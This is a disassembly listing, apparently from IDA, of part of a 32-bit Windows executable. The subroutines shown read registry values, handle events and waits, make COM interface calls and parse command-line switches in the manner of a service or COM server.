                mov     esi, eax
                mov     eax, [ebp+var_4]
                test    esi, esi
                js      loc_14E4C
                mov     ds:100C0F0h, eax
                cmp     [ebp+arg_0], edi
                jz      short loc_14DFA
                lea     eax, [ebp+var_C]
                push    eax
                lea     eax, [ebp+var_8]
                push    eax
                mov     [ebp+var_8], edi
                mov     [ebp+var_C], edi
                call    [ebp+arg_0]
                mov     esi, eax
                test    esi, esi
                js      short loc_14E52
                mov     eax, [ebp+var_8]
                mov     ds:100C028h, eax
                mov     eax, [ebp+var_C]
                mov     ds:100C02Ch, eax
                jmp     short loc_14E52
; ---------------------------------------------------------------------------

loc_14DFA:                              ; CODE XREF: sub_14D5F+70↑j
                push    20019h
                push    1001518h
                push    80000002h
                lea     ecx, [ebp+var_18]
                mov     [ebp+var_18], edi
                mov     [ebp+var_14], edi
                mov     [ebp+var_10], edi
                call    sub_14103
                test    eax, eax
                jnz     short loc_14E42
                push    100C028h
                push    1001598h
                lea     ecx, [ebp+var_18]
                call    sub_140C4
                push    100C02Ch
                push    10015B8h
                lea     ecx, [ebp+var_18]
                call    sub_140C4

loc_14E42:                              ; CODE XREF: sub_14D5F+BD↑j
                lea     ecx, [ebp+var_18]
                call    sub_1415F
                jmp     short loc_14E52
; ---------------------------------------------------------------------------

loc_14E4C:                              ; CODE XREF: sub_14D5F+62↑j
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]

loc_14E52:                              ; CODE XREF: sub_14D5F+4C↑j
                                        ; sub_14D5F+87↑j ...
                push    10040EFh
                call    dword ptr ds:1001150h
                pop     edi
                mov     eax, esi
                pop     esi
                leave
                retn
sub_14D5F       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14E68       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_0]
                push    0
                call    sub_14A83
                pop     ebp
                retn
sub_14E68       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                mov     eax, ds:100C0F4h
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_14E89       proc near               ; CODE XREF: sub_18298+C7↓p
                                        ; sub_184D8+6B↓p ...
                xor     eax, eax
                retn
sub_14E89       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_14E91       proc near               ; CODE XREF: sub_14F39+5↓p
                mov     edi, edi
                push    ebx
                push    esi
                push    edi
                mov     ebx, ecx
                call    sub_13E6C
                mov     esi, 100133Ch
                mov     edi, 100C368h
                movsd
                movsd
                movsd
                movsd
                pop     edi
                pop     esi
                mov     eax, ebx
                pop     ebx
                retn
sub_14E91       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14EB6       proc near               ; CODE XREF: sub_1510E+C2↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                push    100C704h
                call    sub_13A36
                test    eax, eax
                js      short loc_14EE2
                mov     ecx, ds:100C0E0h
                test    ecx, ecx
                jz      short loc_14EE2
                push    dword ptr ds:100C6D0h
                call    ecx
                pop     ecx

loc_14EE2:                              ; CODE XREF: sub_14EB6+17↑j
                                        ; sub_14EB6+21↑j
                pop     ebp
                retn    8
sub_14EB6       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14EEB       proc near               ; CODE XREF: sub_1510E+DE↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, ds:100C0E4h
                test    eax, eax
                jz      short loc_14EFF
                call    eax
                test    eax, eax
                js      short loc_14F0F

loc_14EFF:                              ; CODE XREF: sub_14EEB+C↑j
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                push    100C704h
                call    sub_13AC7

loc_14F0F:                              ; CODE XREF: sub_14EEB+12↑j
                pop     ebp
                retn    8
sub_14EEB       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14F18       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [eax]
                push    1001600h
                push    1001650h
                push    eax
                call    dword ptr [ecx+0Ch]
                pop     ebp
                retn    4
sub_14F18       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_14F39       proc near               ; CODE XREF: CODE:0001B2CD↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                call    sub_14E91
                call    dword ptr ds:1001148h
                and     dword ptr [esi+30h], 0
                push    1
                mov     ecx, 100C704h
                mov     [esi+2Ch], eax
                mov     dword ptr [esi+34h], 1388h
                mov     dword ptr [esi+38h], 3E8h
                mov     byte ptr [esi+3Ch], 1
                mov     byte ptr [esi+3Eh], 0
                call    sub_13E3F
                mov     eax, esi
                pop     esi
                retn
sub_14F39       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_14F7B       proc near               ; CODE XREF: sub_15467+8↓p
                                        ; CODE:0001B37E↓j
                mov     edi, edi
                push    esi
                push    edi
                mov     esi, ecx
                mov     edi, 100C704h
                push    0
                mov     ecx, edi
                call    sub_13E3F
                mov     ecx, esi
                call    sub_13EB4
                mov     ecx, edi
                call    sub_13DF6
                pop     edi
                mov     ecx, esi
                pop     esi
                jmp     sub_13EB4
sub_14F7B       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                jmp     dword ptr ds:10012BCh
; ---------------------------------------------------------------------------
                align 8
                push    esi
                push    edi
                mov     esi, ecx
                call    dword ptr ds:10012C0h
                mov     edi, eax
                test    edi, edi
                jnz     short loc_14FEB
                cmp     [esi+3Ch], al
                jz      short loc_14FDC
                push    dword ptr [esi+30h]
                mov     byte ptr [esi+3Dh], 1
                call    dword ptr ds:1001048h
                jmp     short loc_14FEB
; ---------------------------------------------------------------------------

loc_14FDC:                              ; CODE XREF: CODE:00014FCB↑j
                push    0
                push    0
                push    12h
                push    dword ptr [esi+2Ch]
                call    dword ptr ds:1001290h

loc_14FEB:                              ; CODE XREF: CODE:00014FC6↑j
                                        ; CODE:00014FDA↑j
                mov     eax, edi
                pop     edi
                pop     esi
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_14FF5       proc near               ; CODE XREF: sub_1506E+8↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                push    0FFFFFFFFh
                push    dword ptr [esi+30h]
                call    dword ptr ds:100104Ch
                push    dword ptr [esi+30h]
                call    dword ptr ds:1001054h
                push    0
                push    0
                push    12h
                push    dword ptr [esi+2Ch]
                call    dword ptr ds:1001290h
                pop     esi
                retn
sub_14FF5       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15024       proc near               ; CODE XREF: sub_15209+20↓p

var_4           = byte ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    esi
                push    edi
                xor     edi, edi
                push    edi
                push    edi
                push    edi
                push    edi
                mov     esi, ecx
                call    dword ptr ds:100105Ch
                mov     [esi+30h], eax
                test    eax, eax
                jz      short loc_15065
                lea     eax, [ebp+var_4]
                push    eax
                push    edi
                push    esi
                push    1004416h
                push    edi
                push    edi
                call    dword ptr ds:100114Ch
                mov     edi, eax
                test    edi, edi
                jnz     short loc_15063
                push    dword ptr [esi+30h]
                call    dword ptr ds:1001054h

loc_15063:                              ; CODE XREF: sub_15024+34↑j
                mov     eax, edi

loc_15065:                              ; CODE XREF: sub_15024+1B↑j
                pop     edi
                pop     esi
                leave
                retn
sub_15024       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1506E       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_0]
                call    sub_14FF5
                xor     eax, eax
                pop     ebp
                retn    4
sub_1506E       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15086       proc near               ; CODE XREF: sub_1386A+A0↑p

var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                cmp     byte ptr ds:100C0E8h, 0
                push    esi
                mov     esi, ecx
                jz      short loc_1509D
                or      eax, 0FFFFFFFFh
                jmp     short loc_15104
; ---------------------------------------------------------------------------

loc_1509D:                              ; CODE XREF: sub_15086+10↑j
                push    edi
                push    0
                push    0
                call    dword ptr ds:10012D0h
                mov     edi, eax
                mov     [ebp+var_4], edi
                test    edi, edi
                jns     short loc_150CA
                cmp     edi, 80010106h
                jnz     short loc_15101
                push    10016C8h
                call    dword ptr ds:1001064h
                test    eax, eax
                jnz     short loc_150CE
                jmp     short loc_15101
; ---------------------------------------------------------------------------

loc_150CA:                              ; CODE XREF: sub_15086+29↑j
                mov     byte ptr [esi+3Eh], 1

loc_150CE:                              ; CODE XREF: sub_15086+40↑j
                call    dword ptr ds:1001068h
                lea     ecx, [ebp+var_4]
                push    ecx
                push    eax
                mov     ecx, esi
                call    sub_1510E
                cmp     al, 1
                jnz     short loc_150F2
                push    [ebp+arg_0]
                mov     ecx, esi
                call    sub_152EC
                mov     edi, eax
                jmp     short loc_150F5
; ---------------------------------------------------------------------------

loc_150F2:                              ; CODE XREF: sub_15086+5C↑j
                mov     edi, [ebp+var_4]

loc_150F5:                              ; CODE XREF: sub_15086+6A↑j
                cmp     byte ptr [esi+3Eh], 0
                jz      short loc_15101
                call    dword ptr ds:10012CCh

loc_15101:                              ; CODE XREF: sub_15086+31↑j
                                        ; sub_15086+42↑j ...
                mov     eax, edi
                pop     edi

loc_15104:                              ; CODE XREF: sub_15086+15↑j
                pop     esi
                leave
                retn    4
sub_15086       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1510E       proc near               ; CODE XREF: sub_15086+55↑p

var_10          = dword ptr -10h
var_C           = byte ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                mov     eax, ds:100C088h
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_0]
                push    ebx
                mov     ebx, [ebp+arg_4]
                and     dword ptr [ebx], 0
                push    esi
                push    edi
                mov     esi, 10016E0h
                lea     edi, [ebp+var_C]
                mov     [ebp+var_10], ecx
                movsd
                lea     ecx, [ebp+var_C]
                push    ecx
                movsw
                push    eax
                jmp     short loc_1518E
; ---------------------------------------------------------------------------

loc_15141:                              ; CODE XREF: sub_1510E+8B↓j
                push    10016E8h
                push    esi
                call    sub_1401A
                pop     ecx
                pop     ecx
                test    eax, eax

loc_15150:                              ; DATA XREF: CODE:00007C48↑o
                jz      loc_151E5
                push    1001700h
                push    esi
                call    sub_1401A
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_151BC
                push    1001714h
                push    esi
                call    sub_1401A
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_151D7
                push    100173Ch
                push    esi
                call    sub_1401A
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_151AE
                lea     eax, [ebp+var_C]
                push    eax
                push    esi

loc_1518E:                              ; CODE XREF: sub_1510E+31↑j
                call    sub_13FCE
                mov     esi, eax
                pop     ecx
                pop     ecx
                test    esi, esi
                jnz     short loc_15141
                mov     al, 1

loc_1519D:                              ; CODE XREF: sub_1510E+F4↓j
                mov     ecx, [ebp+var_4]
                pop     edi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    sub_165AB
                leave
                retn    8
; ---------------------------------------------------------------------------

loc_151AE:                              ; CODE XREF: sub_1510E+79↑j
                push    1
                call    dword ptr ds:1001024h
                mov     [ebx], eax
                test    eax, eax
                js      short loc_15200

loc_151BC:                              ; CODE XREF: sub_1510E+57↑j
                push    1
                call    sub_15324
                mov     [ebx], eax
                test    eax, eax
                js      short loc_15200
                mov     ecx, [ebp+var_10]
                push    0
                push    1
                call    sub_14EB6
                jmp     short loc_151FE
; ---------------------------------------------------------------------------

loc_151D7:                              ; CODE XREF: sub_1510E+68↑j
                push    1
                call    dword ptr ds:1001024h
                mov     [ebx], eax
                test    eax, eax
                js      short loc_15200

loc_151E5:                              ; CODE XREF: sub_1510E:loc_15150↑j
                mov     ecx, [ebp+var_10]
                push    0
                push    1
                call    sub_14EEB
                mov     [ebx], eax
                test    eax, eax
                js      short loc_15200
                push    0
                call    sub_15324

loc_151FE:                              ; CODE XREF: sub_1510E+C7↑j
                mov     [ebx], eax

loc_15200:                              ; CODE XREF: sub_1510E+AC↑j
                                        ; sub_1510E+B9↑j ...
                xor     al, al
                jmp     short loc_1519D
sub_1510E       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_15209       proc near               ; CODE XREF: sub_152EC+C↓p
                mov     edi, edi
                push    ebx
                push    edi
                push    5
                push    4
                mov     ebx, ecx
                call    sub_1535F
                mov     edi, eax
                test    edi, edi
                js      short loc_15282
                push    esi
                jnz     short loc_1527B
                cmp     byte ptr [ebx+3Ch], 0
                jz      short loc_15266
                mov     ecx, ebx
                call    sub_15024
                mov     esi, eax
                test    esi, esi
                jnz     short loc_1523B
                mov     edi, 80004005h
                jmp     short loc_15272
; ---------------------------------------------------------------------------

loc_1523B:                              ; CODE XREF: sub_15209+29↑j
                call    dword ptr ds:10012B8h
                mov     edi, eax
                test    edi, edi
                jns     short loc_1525D
                push    dword ptr [ebx+30h]
                call    dword ptr ds:1001048h
                mov     eax, [ebx+34h]
                add     eax, eax
                push    eax
                push    esi
                call    dword ptr ds:100104Ch

loc_1525D:                              ; CODE XREF: sub_15209+3C↑j
                push    esi
                call    dword ptr ds:1001054h
                jmp     short loc_1526E
; ---------------------------------------------------------------------------

loc_15266:                              ; CODE XREF: sub_15209+1C↑j
                call    dword ptr ds:10012B8h
                mov     edi, eax

loc_1526E:                              ; CODE XREF: sub_15209+5B↑j
                test    edi, edi
                jns     short loc_1527F

loc_15272:                              ; CODE XREF: sub_15209+30↑j
                mov     ecx, ebx
                call    sub_1544D
                jmp     short loc_1527F
; ---------------------------------------------------------------------------

loc_1527B:                              ; CODE XREF: sub_15209+16↑j
                mov     byte ptr [ebx+3Ch], 0

loc_1527F:                              ; CODE XREF: sub_15209+67↑j
                                        ; sub_15209+70↑j
                mov     eax, edi
                pop     esi

loc_15282:                              ; CODE XREF: sub_15209+13↑j
                pop     edi
                pop     ebx
                retn    4
sub_15209       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_1528C       proc near               ; CODE XREF: sub_152EC+24↓p
                mov     edi, edi
                push    esi
                push    edi
                mov     esi, ecx
                call    sub_1544D
                cmp     byte ptr [esi+3Ch], 0
                mov     edi, eax
                jz      short loc_152A8
                push    dword ptr [esi+38h]
                call    dword ptr ds:1001050h

loc_152A8:                              ; CODE XREF: sub_1528C+11↑j
                mov     eax, edi
                pop     edi
                pop     esi
                retn
sub_1528C       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_152B2       proc near               ; CODE XREF: sub_152EC+19↓p

var_1C          = byte ptr -1Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 1Ch
                push    edi
                xor     edi, edi
                jmp     short loc_152D3
; ---------------------------------------------------------------------------

loc_152BF:                              ; CODE XREF: sub_152B2+30↓j
                lea     eax, [ebp+var_1C]
                push    eax
                call    dword ptr ds:1001298h
                lea     eax, [ebp+var_1C]
                push    eax
                call    dword ptr ds:100129Ch

loc_152D3:                              ; CODE XREF: sub_152B2+B↑j
                push    edi
                push    edi
                push    edi
                lea     eax, [ebp+var_1C]
                push    eax
                call    dword ptr ds:10012A4h
                test    eax, eax
                jg      short loc_152BF
                pop     edi
                leave
                retn
sub_152B2       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_152EC       proc near               ; CODE XREF: sub_15086+63↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    edi
                push    [ebp+arg_0]
                mov     edi, ecx
                call    sub_15209
                mov     esi, eax
                test    esi, esi
                jnz     short loc_1530C
                mov     ecx, edi
                call    sub_152B2
                test    esi, esi

loc_1530C:                              ; CODE XREF: sub_152EC+15↑j
                js      short loc_15317
                mov     ecx, edi
                call    sub_1528C
                mov     esi, eax

loc_15317:                              ; CODE XREF: sub_152EC:loc_1530C↑j
                pop     edi
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_152EC       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15324       proc near               ; CODE XREF: sub_1510E+B0↑p
                                        ; sub_1510E+EB↑p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                and     [ebp+var_8], 0
                and     [ebp+var_4], 0
                lea     eax, [ebp+var_10]
                push    eax
                push    [ebp+arg_0]
                mov     [ebp+var_10], 1001650h
                push    65h ; 'e'
                push    dword ptr ds:100C364h
                mov     [ebp+var_C], 1001600h
                call    sub_13F51
                leave
                retn    4
sub_15324       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1535F       proc near               ; CODE XREF: sub_15209+A↑p

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = byte ptr -14h
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 20h
                mov     eax, ds:100C088h
                xor     eax, ebp
                mov     [ebp+var_4], eax
                cmp     byte ptr [ecx+40h], 0
                jnz     short loc_15391
                mov     eax, [ebp+arg_4]
                and     eax, 0FFFFFFFEh
                push    eax
                push    [ebp+arg_0]
                push    100C704h
                call    dword ptr ds:1001034h
                jmp     loc_1543A
; ---------------------------------------------------------------------------

loc_15391:                              ; CODE XREF: sub_1535F+16↑j
                and     [ebp+var_1C], 0
                lea     eax, [ebp+var_1C]
                push    eax
                call    sub_1556A
                test    eax, eax
                js      loc_1543A
                mov     eax, [ebp+var_1C]
                and     [ebp+var_18], 0
                mov     ecx, [eax]
                push    esi
                lea     edx, [ebp+var_18]
                push    edx
                push    10014B0h
                push    eax
                call    dword ptr [ecx]
                mov     esi, eax
                test    esi, esi
                js      short loc_15419
                call    dword ptr ds:1001068h
                push    10016A0h
                push    eax
                call    dword ptr ds:100119Ch
                pop     ecx
                pop     ecx
                test    eax, eax
                jnz     short loc_153EE
                mov     eax, [ebp+var_18]
                test    eax, eax
                jz      short loc_153E7
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]

loc_153E7:                              ; CODE XREF: sub_1535F+80↑j
                mov     eax, 80004005h
                jmp     short loc_15439
; ---------------------------------------------------------------------------

loc_153EE:                              ; CODE XREF: sub_1535F+79↑j
                lea     ecx, [ebp+var_14]
                push    ecx
                add     eax, 0Eh
                push    eax
                call    dword ptr ds:10012C8h
                and     [ebp+var_20], 0
                lea     eax, [ebp+var_20]
                push    eax
                push    1
                lea     eax, [ebp+var_14]
                push    eax
                push    [ebp+var_18]
                call    dword ptr ds:1001258h
                mov     esi, eax
                test    esi, esi
                jns     short loc_1542A

loc_15419:                              ; CODE XREF: sub_1535F+61↑j
                mov     ecx, [ebp+var_18]
                test    ecx, ecx
                jz      short loc_15426
                mov     edx, [ecx]
                push    ecx
                call    dword ptr [edx+8]

loc_15426:                              ; CODE XREF: sub_1535F+BF↑j
                mov     eax, esi
                jmp     short loc_15439
; ---------------------------------------------------------------------------

loc_1542A:                              ; CODE XREF: sub_1535F+B8↑j
                mov     eax, [ebp+var_18]
                test    eax, eax
                jz      short loc_15437
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]

loc_15437:                              ; CODE XREF: sub_1535F+D0↑j
                xor     eax, eax

loc_15439:                              ; CODE XREF: sub_1535F+8D↑j
                                        ; sub_1535F+C9↑j
                pop     esi

loc_1543A:                              ; CODE XREF: sub_1535F+2D↑j
                                        ; sub_1535F+41↑j
                mov     ecx, [ebp+var_4]
                xor     ecx, ebp
                call    sub_165AB
                leave
                retn    8
sub_1535F       endp

; ---------------------------------------------------------------------------
                db 4 dup(0CCh)
byte_1544C      db 0CCh                 ; DATA XREF: CODE:00007C48↑o

; =============== S U B R O U T I N E =======================================


sub_1544D       proc near               ; CODE XREF: sub_15209+6B↑p
                                        ; sub_1528C+6↑p
                cmp     byte ptr [ecx+40h], 0
                jnz     short loc_1545F
                push    100C704h
                call    dword ptr ds:1001030h
                retn
; ---------------------------------------------------------------------------

loc_1545F:                              ; CODE XREF: sub_1544D+4↑j
                xor     eax, eax
                retn
sub_1544D       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15467       proc near

arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                call    sub_14F7B
                test    [ebp+arg_0], 1
                jz      short loc_15481
                push    esi
                call    sub_16264
                pop     ecx

loc_15481:                              ; CODE XREF: sub_15467+11↑j
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_15467       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_1548D       proc near               ; CODE XREF: sub_1556A+40↓p
                                        ; sub_156ED+41↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                and     dword ptr [esi+8], 0
                push    edi
                push    6
                xor     eax, eax
                pop     ecx
                lea     edi, [esi+0Ch]
                rep stosd
                mov     [esi+24h], al
                mov     dword ptr [esi], 100165Ch
                mov     dword ptr [esi+4], 1001670h
                mov     ecx, ds:100C364h
                mov     eax, [ecx]
                call    dword ptr [eax+4]
                pop     edi
                mov     eax, esi
                pop     esi
                retn    4
sub_1548D       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================


sub_154C8       proc near               ; CODE XREF: sub_15615+8↓p
                mov     edi, edi
                push    esi
                lea     esi, [ecx+8]
                mov     dword ptr [ecx], 100165Ch
                mov     dword ptr [ecx+4], 1001670h
                mov     dword ptr [esi], 0C0000001h
                mov     ecx, ds:100C364h
                mov     eax, [ecx]
                call    dword ptr [eax+8]
                mov     ecx, esi
                pop     esi
                jmp     sub_14277
sub_154C8       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_154F9       proc near               ; CODE XREF: CODE:000157B8↓j

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                add     eax, 8
                push    eax
                call    dword ptr ds:1001164h
                pop     ebp
                retn    4
sub_154F9       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15514       proc near               ; CODE XREF: CODE:000157C7↓j

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                push    edi
                lea     eax, [esi+8]
                push    eax
                call    dword ptr ds:1001160h
                mov     edi, eax
                test    edi, edi
                jnz     short loc_1553B
                test    esi, esi
                jz      short loc_1553B
                mov     edx, [esi]
                push    1
                mov     ecx, esi
                call    dword ptr [edx+10h]

loc_1553B:                              ; CODE XREF: sub_15514+18↑j
                                        ; sub_15514+1C↑j
                mov     eax, edi
                pop     edi
                pop     esi
                pop     ebp
                retn    4
sub_15514       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15548       proc near               ; CODE XREF: CODE:000157A9↓j

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    1001480h
                push    [ebp+arg_0]
                call    dword ptr ds:1001038h
                pop     ebp
                retn    0Ch
sub_15548       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_1556A       proc near               ; CODE XREF: sub_1535F+3A↑p
                push    0Ch
                mov     eax, 100A5DFh
                call    sub_16603
                mov     ebx, [ebp+8]
                test    ebx, ebx
                jnz     short loc_15587
                mov     eax, 80004003h
                jmp     loc_15608
; ---------------------------------------------------------------------------

loc_15587:                              ; CODE XREF: sub_1556A+11↑j
                and     dword ptr [ebx], 0
                and     dword ptr [ebp-18h], 0
                and     dword ptr [ebp-4], 0
                mov     esi, 8007000Eh
                push    28h ; '('
                mov     [ebp-14h], esi
                call    sub_163B0
                pop     ecx
                test    eax, eax
                jz      short loc_155B3
                push    0
                mov     ecx, eax
                call    sub_1548D
                mov     edi, eax
                jmp     short loc_155B5
; ---------------------------------------------------------------------------

loc_155B3:                              ; CODE XREF: sub_1556A+3A↑j
                xor     edi, edi

loc_155B5:                              ; CODE XREF: sub_1556A+47↑j
                or      dword ptr [ebp-4], 0FFFFFFFFh
                jmp     short loc_155CE
; ---------------------------------------------------------------------------
                or      dword ptr [ebp-4], 0FFFFFFFFh
                mov     eax, 100496Dh
                retn
; ---------------------------------------------------------------------------
                mov     ebx, [ebp+8]
                mov     esi, [ebp-14h]
                mov     edi, [ebp-18h]

loc_155CE:                              ; CODE XREF: sub_1556A+4F↑j
                test    edi, edi
                jz      short loc_15604
                lea     esi, [edi+8]
                push    esi
                call    dword ptr ds:1001164h
                mov     ecx, esi
                call    sub_14291
                mov     esi, eax
                test    esi, esi
                js      short loc_155EB
                xor     esi, esi

loc_155EB:                              ; CODE XREF: sub_1556A+7D↑j
                lea     eax, [edi+8]
                push    eax
                call    dword ptr ds:1001160h
                test    esi, esi
                jz      short loc_15604
                mov     eax, [edi]
                push    1
                mov     ecx, edi
                call    dword ptr [eax+10h]
                xor     edi, edi

loc_15604:                              ; CODE XREF: sub_1556A+66↑j
                                        ; sub_1556A+8D↑j
                mov     [ebx], edi
                mov     eax, esi

loc_15608:                              ; CODE XREF: sub_1556A+18↑j
                call    sub_16679
                retn    4
sub_1556A       endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15615       proc near

arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                call    sub_154C8
                test    [ebp+arg_0], 1
                jz      short loc_1562F
                push    esi
                call    sub_16264
                pop     ecx

loc_1562F:                              ; CODE XREF: sub_15615+11↑j
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_15615       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_1563B       proc near               ; CODE XREF: sub_156C7+8↓p
                mov     eax, ecx
                lea     ecx, [eax+4]
                mov     dword ptr [ecx], 0C0000001h
                mov     dword ptr [eax], 1001440h
                jmp     sub_14277
sub_1563B       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15656       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                add     eax, 4
                push    eax
                call    dword ptr ds:1001164h
                pop     ebp
                retn    4
sub_15656       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_15671       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                push    edi
                lea     eax, [esi+4]
                push    eax
                call    dword ptr ds:1001160h
                mov     edi, eax
                test    edi, edi
                jnz     short loc_15698
                test    esi, esi
                jz      short loc_15698
                mov     edx, [esi]
                push    1
                mov     ecx, esi
                call    dword ptr [edx+14h]

loc_15698:                              ; CODE XREF: sub_15671+18↑j
                                        ; sub_15671+1C↑j
                mov     eax, edi
                pop     edi
                pop     esi
                pop     ebp
                retn    4
sub_15671       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_156A5       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    1001458h
                push    [ebp+arg_0]
                call    dword ptr ds:1001038h
                pop     ebp
                retn    0Ch
sub_156A5       endp

